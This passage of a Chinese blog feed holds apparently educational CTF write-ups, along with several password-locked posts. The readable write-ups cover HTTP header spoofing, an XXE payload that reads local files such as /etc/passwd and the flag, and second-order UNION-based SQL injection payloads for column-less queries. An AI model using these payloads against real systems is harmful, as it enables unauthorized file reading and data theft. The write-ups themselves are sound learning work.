2233dc1503f7db5a55eb275f9a437c1d0751ad44011d222fa345cdbf19d4331d7d11c2b76a02bd800551bc2e4920e879e81b55c6e9cc93b4759fc4b0e0c4f7dd3ca2db44e4760f37eb5c55e449dfa00278a0dd821f6d24ab2cfc8c59670dd2c54514ccf08322772dfd549a8616f3806b39ac95f83d616050fb0463c81087524ba11661ef83e48b2a901e7c8d93572b9a71912e16d2b39b9e421c5c56624c3264f66bcfe0c1eb083474d10bd774960bca028af8b40b9469c025e2753efd92c009e72dfe5305970c16fb76b17aedc45dd7fb9540a5ec2d0f7d5579e065912d3d7a445c84649c92febaa76c562ac5adb61e40742a99414ba633e049cea18aa561caf576c35ca7cac95e0a2c12e43875a5ebcddce84a2a518c8e9300de094083153f0167721e40f75a515e6c5b30c7b22c41a597e8d655f00c9d71fd573be23479c55babce21701b22e36417955b0967ce8a8d0ae491d4bad8ded100872e7a8eaa45acdbabe14f09be3b9bdc57477f8b0f29d68e0b14257c617632e3372fc4b30994fa5c70cccb3cc25954480483491962a3e2b43f7c5f2f6d4c48b7f027f8341f592b6344f7aab8816211bc07c4d473c619dd8f07175cf2674cdc388916875ec042e0ece98864fc2d6bb45dc5adb402b1036a2b60492e9d1d23c43a3412aa9448886228c5ed8cadf87ab15b5144501c414fc2fdc04cd8e63398116efb265a5584aa58ab7a0888543503c7a340482fe3019df44371064b680fe7f0727832c38888b23d8f61f69a963aa71c8b868b080fa2aa8072cb3b97a0bd4e9f49ec79e1b0ab438b11375c22053c1b947522d7f3780e602e0b3321b691469e661588347d59c57fc3fb378745b178f82b1745d147f2127ba604712f20c85aef96881d0eda0b89359f6318e37e671acb4e6539717f5f563997bc005a01dac10305cbdcb08a854acf963dd857cf615a4505d343946ac42411e670e4548b04185c5b82a891e2d7aa9d020a52d9594cdb03cb52621c0205d6883de2124fbeea2a6bdeee9801ad3968f767b26a7209955e819acb466a212ce32414852868af45e91aa879173191159084457360cae113a35653052a590260b3fe850edc62dfd0d4ee7c0231fda4819a14b9fec62ea3d88e9abefdca496c22327fcb3eecbc795f4685f3152631392fb6a7b3972eb5455fceccaadd567fed651473f470c87051039a92c5bcebdc98d6d0d184c97df9bb961c73c43ba9ec08cbc0be9d2c8a1dd06f3cb7f7694e00070ddf133c1157d7130084acaa025210267797291026383ac7b4b116d85e8b3f59f970f0718611d7831f923b4f8641f418227a8e45b8c861d59a3ea9b14c030403a0c48d5d648cd11097616150c583ba4ef594b26491a0affa884ec2ee25acaa9b1b3be8446f65d102ff7f85e083ab88e8a9f8daca5697d4f8a22a9551e8b3cb563e41fa909a8011f247e3aab2c9918c33d45c99282f8f72e5b5f786550eaf4afb58547231d1f96606f2c2ac549a90c92eeec3aa0d7196da6af0612ccdb15d658356d9759fbbf1d24f5e94330832714259e10f589708e8db9e0cb44982a31986dabe1c9bf4300a9ee2c2e624ba217edde42d2372187ee8988016ca3f4547cce3db52ff181efefa8685764295fae2e30761f22056545ab8a32e8fa6967e9451ad220d943cce93ae20805a1eab267afab3790804e6af390036923190f17dc42106c197c636685a07b12480cf4b041ace6adfdbbe73699d49c96bbd774c9a5aab1a3d5b9e1d12ffa1c2792bfe7357c452b40d0e039bcb4c5b89f912429a77082b31a08c4879bc6a94ae5bf2fae7de9d78160051435085a382318ff765820902b567b9d7341dfe3bc4680b49e338389dd5d2455b4dd4f46f74863ee067edf7c138fd45778b25acb56955ddafb667876f203c6e7986b3d4cc7dcde76ee9c673941a0812154fb2e129d6776e85a6ebbc640514ff23fa14779a2357e1925d7f532983e42a4eb581e8dc844bbd520e57f2a8a83e5df198d8d4b9b2210444af96212da2b87855ee4251546415439a127d2584aa0b800c0e60b42b0bbce474cde862085f4726a4367af9eddfec1914453d11b5618f3b3433ff2d714d6bb51f3b47c23445d7ec3195436f03351918bf88813e8f548aeb247d34717ebad336b7b16d49a59f2997a739f163b4d86410ea673e7d5d761a1fd3404a23dae021e894f1e241f50990573ac90f24779c96aa3b55731e534ea93299f310d5b5edc099eedb9414e3f92787ab7fd5c6933ed5ce1a8e5790144e0164348242dd66b7ba9230671d087f58b5e5d2991f5942e64f5e527986730b9833d9d4f7d7f1dcd44ef74c9772ecffce39837c8a42200b933843c883288acdd99f975a5cc049dfdf4393279ff0108229c2846f3be6fd9edb14c8fbc90a3102869856fea58f80212236cde25e1e8720b4880999d141242cd138ec126aedf8246c9dc30876f658b190d61570d5c31e17bbc80aa182b95f3f7d66c49863fe1e7c302a37e7f8918aa9ee14548a6d5a1fe62805f0679ce03f6852c64f4d0091482c81e3130487a0aaaba109b63703b620dd19c414c40c0487e3f162d15b5166d93e7147e1b7b27b275bebfcc4b9bc2938f8be2c6c74e6d88ac20cc8c9b5106ae9f95841fa09f24bd69d66d6bd41e613398388c578892ecf19d75a10743f4b89eff3f8e79869168d66c3db622abc67c837843f80b0bdfe002591d1e8df0ef8816f1a78413a42d0a7866d097621f1a3d519009c493a0afbaff44dec9509781c379725e54fb74801053b67092bacfe41469600b839527a68e8ade0128b6cc126a281b9c69f9b42960369af31cd8f85da186ca7b948d0488a4f2250bf75fa27b2d6b7746f9a1fee8b21794bcdc361d4da5bcecd0f11ec562751afc064b6c04502d0c9173ee0b8abcf189de6a75a581aac157773c0761c674ecdc3d37d74b8f1a6a7766e02321b7fe1daf827d170190fc6de566886c2b0d785a6ede5dcb3f66e2fd75cc2fb35c059b8a9518d411dd60bab3fe75d76bacb607743b7ebf2126fe21f8aeadea3ce48ce808bb804a82e3c4eaef0d8bd6e388995c22890b6bd430362afaf83d5f8c31ac6514f70d0dbeefafd9ddab377acaa27ad7c0eb18b27ccb14c31b1c4db98439021c7852cf6405fb3cae04fafaca92686f8cf360e3039db3cdc2047beb53ff3e9364fbf131231fe06d1b38350089bd075e1a403c3020bbe4374c490d210b4a8391c13c0148eab612c02860e780cef57fc20b1201b1415ee5eee9ecc38e62bec711f2dd4e05b969d5b3a36797babf26146d641863e857c572637b82b0530eea649f5af3602c76dcf6bfc811568079ed68dbc89bd09ced318fde59ab71c30ed4b0e9216fcca0e283ba47f7274bfc87f46aad7aa6d6b114181f858be6a5d6e687c79f02ce704b46269da48f3a7614fe04c4af4ca380a69bcdbf1fce482b1624e9822d20d590dfba82d07818aee8ff4eb712185910e27ab856585ed1d9cadf3a26905846815195792c99375a8faeb45386c1e2e288481af0aa81c7e58144475d359c41d2b5ae8ed69bf506c29009dc0deb3ffcb71aa8eedcc9be0507f0468234c3383bf1c8dad85af0be43d56c2115aa385738da37a2955438a7a2702517ff2e28a7cebdbbbd6e243f5ae40848f18b1a9e1421969429cfc770efbc93917175ba114491cce86743e6a2eb0babd7dc2e7e09880495dd09b7b4479dd968292a7ba8fb327a153be462109f811408048cfe307fedab47df5fa031a18749e25d58e05b4db5591fc2b059c36d975ef77c2c60ca881e6cdd44a778a9b1c6cd25120430d689ecd7c0ffab517583c4e4e4cf896d30d3eb5705ade647f4b80c72f6e9873acbdb79d3086fa29a958ec8b93021766cc5ad1dd78e7eb8e0c325691bc2a70142966882212ad58b0a0840284451e1353ca74002edd652ca4b0ce37603365c047aece78bc3d3f1bd33285c95933dbec0e0bc88af5b56d2a5f49d984f6541d011eaf6d19889cb468ac85779f2e5d35c6ff354db9f0337fc5466bba4f45ebec8be6d96d0733332829e5a4535515a8fbae2b8e624a1326d49ee293533b6aec390a7fdbce5134620d7ba0428800e4ae11bf01f33ac24cd355fa55c83f7a8a4b69cfe77e7aae8dd98a8b4a829e594d7b7e8d6dffb868624d893933ff75862b7255111349b386453253a63ed1b643d94d6a3a4fe42ca75e3ccd68f63e31f784ca7c53e66ede91d2446ba5380b40e21c3de911c59f075ffc7ed34aad343e4cfcfc6fde8cd9c2c57de7dac5407e306245b9b54660bfaf5f8cce360cf27ad5c1f62647176785ad28ffa3fe578930140335e5e4e26170e914197f79299599c716c5818fcf331f548930594828352fb5e701def1370120fd6e3d889739e126bfdebe599c09e145e92f59e041960f012e3444fe5e2ef821f8409fb0ac761dad47b7ae2759fdc7982498d39b8f35a136f85f07e51a30fa2b5ca55f2983cfe81e18b8feb7b071595d12aee0aadca1d5c594aaed06efd56d49f66de81f3a6891b064cee99157e01b7a1568d02dfb286913a3dec24f63883d544222e24adb507351579c144302aae569bb2eae5cae2ec462b91086d34a9780ec009b0df0c66949b50e327429db12624526120872d6cadb2420890b7099edc472b3a43b0ff6642b4ebb017db2b8c6c3266393f9b1e477b8a24e3ce4415ec3e013e10758372ed63c6b622844f29c65509e6256ce5dc57d7b810e4d1af4eadbca1044d2e451524d1146494b19a2b6d5f711789be75441dccaa7e5e928c369900fe870d2ef27d8d1f369e0dd877d40f7bddcd0a27dc615105ab6fc5186d1dbf92917828089f8012c8ac5a943d49745821c405d8d54855bdfbd53f2c2facd4971c9a4b458313a8fb37dadba2517345794b8cfea86043e7adbd9d5713a48e8482a5db93ede23d33c152b4ef5da6386fa004964b2f38c1dcaa0373a5595ff35815bceb4fc651902fc4b5376039361bc17d3ccc881a1e65ab3fbe2b9070666a1fef3d7291c448401b00925594abbf0dad7999c295fd8b068839cf2c7a4894262c2f68b83d954de208472e4ffe554607bc8bce8fd2bce2f293d7da241d348af0e4dad208a1258af43ddc362a2c9ee2991a13dcf96178812f42bd47be9d925bae846f63956a2c7243c1764e6ca2cb3fb6d66765040ac791f16697ff4c829f225b0fb9ffdd5ecec778c98f48e0d86e6e70da2b95bdf45f374d5bdb7301c2778346e986a9d1ca906f3fc5166837c0f598c6fb1492af9b6789de699d3015c086f3a3fd7855883422c1de6e5628d1a7d4fc6e643b75784f4ae353a23404f969e7e219c55afe6e6154</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    
    <category term="C" scheme="http://example.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>C</title>
    <link href="http://example.com/2021/09/20/C%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2021/09/20/C%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-09-20T04:37:58.000Z</published>
    <updated>2021-09-21T02:11:15.165Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="1039c510739f82f479c1ae75da737c5e648f2f57ea494439b95f503e5abf7b6e"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    
    <category term="C" scheme="http://example.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>二分法盲注</title>
    <link href="http://example.com/2021/01/18/%E4%BA%8C%E5%88%86%E6%B3%95%E7%9B%B2%E6%B3%A8/"/>
    <id>http://example.com/2021/01/18/%E4%BA%8C%E5%88%86%E6%B3%95%E7%9B%B2%E6%B3%A8/</id>
    <published>2021-01-18T15:26:54.000Z</published>
    <updated>2021-09-17T14:56:55.567Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="39eb005e37bf92e38025ca6be31f65660881cd37972b90b4bc31e6a9df74d724"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>HTTP特殊请求头</title>
    <link href="http://example.com/2021/01/18/HTTP%E7%89%B9%E6%AE%8A%E8%AF%B7%E6%B1%82%E5%A4%B4/"/>
    <id>http://example.com/2021/01/18/HTTP%E7%89%B9%E6%AE%8A%E8%AF%B7%E6%B1%82%E5%A4%B4/</id>
    <published>2021-01-18T13:57:40.000Z</published>
    <updated>2021-01-18T13:59:45.974Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>最近做了一道CTF的题，里面应用了http的各种头，记录下来学习学习</p></blockquote><h1 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h1><h3 id="打开题目"><a href="#打开题目" class="headerlink" title="打开题目"></a>打开题目</h3><p><img src="https://i.loli.net/2020/12/20/NqxatShcbRrQwyj.png" alt="image-20201220223807400"></p><blockquote><p>尝试弱口令登录与SQL注入</p></blockquote><p>抓包</p><p><img src="https://i.loli.net/2020/12/20/Kwq5lz42gfh9oCA.png" alt="image-20201220224157732"></p><p>修改时间，然后发现新线索</p><p><img src="https://i.loli.net/2020/12/20/OWMv6lu5HycxE7g.png" alt="image-20201220224129130"></p><p>使用**<em>Client-ip: 127.0.0.1**</em> ,又出现新的线索</p><p><img src="https://i.loli.net/2020/12/20/8W1zlVCqOQEtvN6.png" alt="image-20201220224438421"></p><p>使用*** Referer: gem-love.com *** 又有新提示</p><p><img src="https://i.loli.net/2020/12/20/ZbgB52qGpS6n8Xl.png" alt="image-20201220224558708"></p><p>这里有个坑，需要使用Commodo 64的全称，Commodore 64；</p><p><strong>* User-Agent： Commodore 64*</strong> </p><p><img src="https://i.loli.net/2020/12/20/rVhP4yswMF38g1k.png" alt="image-20201220225317596"></p><p>指定邮箱*** From: <a href="mailto:&#114;&#x6f;&#111;&#x74;&#64;&#x67;&#101;&#x6d;&#45;&#108;&#111;&#x76;&#101;&#46;&#99;&#x6f;&#x6d;">&#114;&#x6f;&#111;&#x74;&#64;&#x67;&#101;&#x6d;&#45;&#108;&#111;&#x76;&#101;&#46;&#99;&#x6f;&#x6d;</a>***</p><p><img src="https://i.loli.net/2020/12/20/eWg5bEnzAyQfTkY.png" alt="image-20201220225553050"></p><p>指定服务器**<em>Via: y1ng.vip**</em></p><p><img src="https://i.loli.net/2020/12/20/AxtY9Kzbp2UhNiZ.png" alt="image-20201220225711978"></p><p>base64解码即可</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个题目本身不难，主要考的就是**<em>请求首部字段**</em>的熟练使用</p><table><thead><tr><th>Header</th><th>作用</th></tr></thead><tbody><tr><td>Accept</td><td>指定客户端能够接收的内容类型</td></tr><tr><td>Via</td><td>通知中间网关或代理服务器地址，通信协议</td></tr><tr><td>Referer</td><td>先前的网址，当前请求的网页紧随其后，即来路</td></tr><tr><td>Range</td><td>只请求实体的一部分，指定范围</td></tr><tr><td>From</td><td>发出请求的用户的Email</td></tr><tr><td>Cookie</td><td>存储cookie信息</td></tr><tr><td>User-Agent</td><td>包含发出请求的用户信息</td></tr><tr><td>TE</td><td>客户端接受的传输编码，通知服务器接受尾加头信息</td></tr><tr><td>Host</td><td>指定请求的服务器的域名和端口号</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;最近做了一道CTF的题，里面应用了http的各种头，记录下来学习学习&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;BJDCTF-2nd-假猪套天下第一&quot;&gt;&lt;a href=&quot;#BJDCTF-2nd-假猪套天下第一&quot; class=&quot;header</summary>
      
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞</title>
    <link href="http://example.com/2021/01/17/XXE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/01/17/XXE%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-01-17T14:45:34.000Z</published>
    <updated>2021-01-17T14:46:11.722Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>XXE漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">XXE(XML External Injection)全称为XML外部实体注入</span><br><span class="line"></span><br><span class="line">XML：设计用来传输与显示数据，其焦点是数据的内容</span><br><span class="line">HTML：设计用来显示数据，其焦点是数据的外观</span><br><span class="line"></span><br><span class="line">XML文档类型定义，即DTD。XXE漏洞所在的地方</span><br><span class="line">XXE漏洞的触发点一般发生在可以上传XML文件的位置，没有对上传的XML文件进行过滤，导致恶意的xml文件被上传。</span><br></pre></td></tr></table></figure><h4 id="XML基本了解"><a href="#XML基本了解" class="headerlink" title="XML基本了解"></a>XML基本了解</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">xml的注意要求：</span><br><span class="line">1. 所有xml元素都必须有关闭标签</span><br><span class="line">2. xml标签对大小写敏感</span><br><span class="line">3. xml必须正确嵌套</span><br><span class="line">4. xml文档必须有根元素</span><br><span class="line">5. xml的属性值必须加引号</span><br><span class="line"></span><br><span class="line">xml文档的注释：&lt;!-- --&gt;</span><br><span class="line"></span><br><span class="line">DTD(文档类型定义)：可定义合法的xml文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行的声明于XML文档中，也可以作为一个外部引用</span><br><span class="line"></span><br><span class="line">DTD的三种应用形式：</span><br><span class="line">1. 内部DTD文档  &lt;!DOCTYPE 根元素[定义内容]&gt;</span><br><span class="line">2. 外部DTD文档  &lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;</span><br><span class="line">3. 内外DTD结合  &lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot; [定义内容]&gt;</span><br><span class="line"></span><br><span class="line">DTD实体：</span><br><span class="line">用于定义引用普通文本或特殊的快捷方式变量；实体引用是对实体的以用；实体可在内部或外部进行声明。</span><br><span class="line">实体分为：一般实体和参数实体</span><br><span class="line">一般实体的声明方法：&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;  引用一般实体的方法：&amp;实体名称</span><br><span class="line">* 一般实体可以在DTD，xml，声明前，实体声明内部引用</span><br><span class="line">参数实体的声明：&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;  引用参数实体的方法：%实体名称</span><br><span class="line">* 参数实体只能在DTD中引用</span><br><span class="line">内部实体：&lt;!ENTITY 实体名称 &quot;实体的值&quot; &gt; </span><br><span class="line">例：&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;</span><br><span class="line">   &lt;!ENTITY xxe &quot;hello&quot;&gt;]&gt; </span><br><span class="line">   &lt;foo&gt;&amp;xxe&lt;&#x2F;foo&gt;</span><br><span class="line">外部实体：用来引入外部资源，有SYSTEM 和 PUBLIC 两个关键字，表示实体来自本地计算机还是公共计算机</span><br><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt;</span><br><span class="line"></span><br><span class="line">外部实体的引用可以利用如下协议：</span><br><span class="line">file:&#x2F;&#x2F;&#x2F;path&#x2F;to&#x2F;file.txt</span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;file.txt</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.txt</span><br><span class="line"></span><br><span class="line">外部实体可以支持http,file 等协议，所以可以通过引用外部实体进行远程文件读取</span><br><span class="line">例：&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xdsec [</span><br><span class="line">&lt;!ELEMENT methodname ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe(实体引用名) SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;(实体内容) &gt;]&gt;</span><br><span class="line">&lt;methodcall&gt;</span><br><span class="line">&lt;methodname&gt;&amp;xxe;&lt;&#x2F;methodname&gt;</span><br><span class="line">&lt;&#x2F;methodcall&gt;</span><br><span class="line">这里的xml外部实体xxe被赋予的值为file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd 当解析xml文档时，&amp;xxe会被替换为file:&#x2F;&#x2F;&#x2F;ect&#x2F;passwd的内容，导致敏感信息泄露</span><br></pre></td></tr></table></figure><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>此题就是一个简单的xxe攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&lt;? xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELENENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY person SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">&lt;username&gt;&amp;person;&lt;&#x2F;username&gt;</span><br><span class="line">&lt;password&gt;123&lt;&#x2F;password&gt;</span><br><span class="line">&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/01/SMizh13REwGK4NJ.png" alt="image-20210101221407136"></p><blockquote><p>flag的位置是猜出来的</p></blockquote><p><strong>XXE漏洞后期可以专门学习一下</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NCTF2019-Fake-XML-cookbook&quot;&gt;&lt;a href=&quot;#NCTF2019-Fake-XML-cookbook&quot; class=&quot;headerlink&quot; title=&quot;[NCTF2019]Fake XML cookbook&quot;&gt;&lt;/a&gt;[NCTF20</summary>
      
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>无列名注入</title>
    <link href="http://example.com/2021/01/17/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2021/01/17/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/</id>
    <published>2021-01-17T14:43:37.000Z</published>
    <updated>2021-01-17T14:44:34.899Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h1><blockquote><p>2021.1.16</p></blockquote><p>这题确实不会，查看大佬的wp</p><blockquote><p>需要利用MariaDB的一些特性</p></blockquote><h3 id="知识点学习"><a href="#知识点学习" class="headerlink" title="知识点学习"></a>知识点学习</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB数据库可以利用 mysql.innodb_table_stats 查表名</span><br><span class="line">select group_concat(table_name) from mysql.innodb_table_stats</span><br></pre></td></tr></table></figure><h4 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h4><p><img src="https://i.loli.net/2021/01/16/A84hlyWBDit2JRv.png" alt="image-20210116224446299"></p><blockquote><p>正常查询时列名正常显示</p></blockquote><p><img src="https://i.loli.net/2021/01/16/y132WJfRGQIiXsY.png" alt="image-20210116224526741"></p><blockquote><p>使用联合查询，这时列名发生了变化</p></blockquote><p><strong>这里可以利用这个方式在不知道列名的情况下查询内容</strong></p><p><img src="https://i.loli.net/2021/01/16/YrJjZqGx57L2OwT.png" alt="image-20210116224644826"></p><blockquote><p>使用反引号和别名，直接获取到了单列的值</p></blockquote><p>反引号禁用时</p><p><img src="https://i.loli.net/2021/01/17/WZLItMnwHgpuEea.png" alt="image-20210116224745966"></p><blockquote><p>这里直接利用了取别名的方式，没有使用反引号</p></blockquote><p><a href="https://www.cnblogs.com/wangtanzhi/p/12241499.html">相关学习文章</a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><blockquote><p>二次注入</p></blockquote><p>直接将广告名写为<code>1’</code>,保存后查看</p><p><img src="https://i.loli.net/2021/01/16/X7spl92mhPaSAVj.png" alt="image-20210116231225422"></p><blockquote><p>这题需要在申请广告的广告名处注入，之前搞错了…… 拿着id怼了半天……</p></blockquote><p><img src="https://i.loli.net/2021/01/16/yTW5QDNOxFw6iA3.png" alt="image-20210116233000715"></p><p><img src="https://i.loli.net/2021/01/16/qCaRDUL7fNQ89PT.png" alt="image-20210116232950459"></p><blockquote><p>这里报错字段长度不对劲</p></blockquote><p><img src="https://i.loli.net/2021/01/16/wNePUZ6cGOmBEAT.png" alt="image-20210116233057745"></p><p><img src="https://i.loli.net/2021/01/16/AS4xrPyTJiYIgh5.png" alt="image-20210116233047870"></p><blockquote><p>多次尝试发现字段长度为22并且回显的地方为2，3两处</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查库：-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,user(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;&#39;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/16/eaVDdcNtIFxEb4r.png" alt="image-20210116233316001"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;a&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;&#39;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/17/cjwNtdGaRMoLy1C.png" alt="image-20210117000629293"></p><blockquote><p>此题主要掌握无列名查询与查询表名的新方法</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SWPU2019-Web1&quot;&gt;&lt;a href=&quot;#SWPU2019-Web1&quot; class=&quot;headerlink&quot; title=&quot;[SWPU2019]Web1&quot;&gt;&lt;/a&gt;[SWPU2019]Web1&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;2021.1.16&lt;/</summary>
      
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>CUMT2020-岁末赛</title>
    <link href="http://example.com/2020/12/30/CUMT2020-%E5%B2%81%E6%9C%AB%E8%B5%9B/"/>
    <id>http://example.com/2020/12/30/CUMT2020-%E5%B2%81%E6%9C%AB%E8%B5%9B/</id>
    <published>2020-12-30T13:44:22.000Z</published>
